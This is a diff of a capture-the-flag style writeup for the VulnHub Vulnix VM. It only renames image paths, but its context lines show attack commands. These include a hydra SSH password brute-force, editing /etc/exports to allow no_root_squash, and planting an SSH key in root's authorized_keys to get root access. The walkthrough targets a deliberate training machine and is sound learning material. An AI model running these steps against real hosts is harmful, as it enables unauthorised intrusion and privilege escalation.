@@ -7,7 +7,7 @@ tags: oscp, vulnhub, writeups
 ## Overview
 This is a writeup for VulnHub VM [HackLAB: Vulnix](https://www.vulnhub.com/entry/hacklab-vulnix,48/). Here's an overview of the `enumeration` → `exploitation` → `privilege escalation` process:  
 
-![writeup.overview.killchain](/static/files/post_vulnhub_vulnix/killchain.png)
+![writeup.overview.killchain](/static/files/posts_vulnhub_vulnix/killchain.png)
 
 ## Phase #1: Enumeration
 1\. Here's the Nmap scan result:  
@@ -311,7 +311,7 @@ hydra -l user -P /usr/share/wordlists/rockyou.txt -e nsr ssh://192.168.92.177
   Hydra (http://www.thc.org/thc-hydra) finished at 2019-09-20 14:09:45
 ```
 
-![writeup.enumeration.steps.4.1](/static/files/post_vulnhub_vulnix/screenshot01.png)  
+![writeup.enumeration.steps.4.1](/static/files/posts_vulnhub_vulnix/screenshot01.png)  
 
 ### Findings
 #### Open Ports:
@@ -362,11 +362,11 @@ exit
 ssh vulnix@192.168.92.177
 ```
 
-![writeup.exploitation.steps.2.1](/static/files/post_vulnhub_vulnix/screenshot03.png)  
+![writeup.exploitation.steps.2.1](/static/files/posts_vulnhub_vulnix/screenshot03.png)  
 
-![writeup.exploitation.steps.2.2](/static/files/post_vulnhub_vulnix/screenshot04.png)  
+![writeup.exploitation.steps.2.2](/static/files/posts_vulnhub_vulnix/screenshot04.png)  
 
-![writeup.exploitation.steps.2.3](/static/files/post_vulnhub_vulnix/screenshot05.png)  
+![writeup.exploitation.steps.2.3](/static/files/posts_vulnhub_vulnix/screenshot05.png)  
 
 ## Phase #2.5: Post Exploitation
 ```
@@ -400,7 +400,7 @@ sudo -l
 cat /etc/exports
 ```
 
-![writeup.privesc.steps.1.1](/static/files/post_vulnhub_vulnix/screenshot06.png)  
+![writeup.privesc.steps.1.1](/static/files/posts_vulnhub_vulnix/screenshot06.png)  
 
 2\. This means we can create a new share and mount it with `no_root_squash` option:  
 ```
@@ -408,14 +408,14 @@ sudoedit /etc/exports
 cat /etc/exports
 ```
 
-![writeup.privesc.steps.2.1](/static/files/post_vulnhub_vulnix/screenshot07.png)  
+![writeup.privesc.steps.2.1](/static/files/posts_vulnhub_vulnix/screenshot07.png)  
 
 3\. We have to reboot the target for the `/etc/exports` changes to take affect:  
 ```
 showmount -e 192.168.92.177
 ```
 
-![writeup.privesc.steps.3.1](/static/files/post_vulnhub_vulnix/screenshot08.png)  
+![writeup.privesc.steps.3.1](/static/files/posts_vulnhub_vulnix/screenshot08.png)  
 
 4\. We can now repeat the exploitation steps but this time for user `root` and enable remote SSH access:  
 ```
@@ -427,18 +427,18 @@ cp ~/.ssh/id_rsa.pub ./.ssh/authorized_keys
 ssh root@192.168.92.177
 ```
 
-![writeup.privesc.steps.4.1](/static/files/post_vulnhub_vulnix/screenshot09.png)  
+![writeup.privesc.steps.4.1](/static/files/posts_vulnhub_vulnix/screenshot09.png)  
 
-![writeup.privesc.steps.4.2](/static/files/post_vulnhub_vulnix/screenshot10.png)  
+![writeup.privesc.steps.4.2](/static/files/posts_vulnhub_vulnix/screenshot10.png)  
 
-![writeup.privesc.steps.4.3](/static/files/post_vulnhub_vulnix/screenshot11.png)  
+![writeup.privesc.steps.4.3](/static/files/posts_vulnhub_vulnix/screenshot11.png)  
 
 5\. We can now access the flag to complete the challenge:  
 ```
 cat /root/trophy.txt
 ```
 
-![writeup.privesc.steps.5.1](/static/files/post_vulnhub_vulnix/screenshot12.png)  
+![writeup.privesc.steps.5.1](/static/files/posts_vulnhub_vulnix/screenshot12.png)  
 
 ## Loot
 ### Hashes
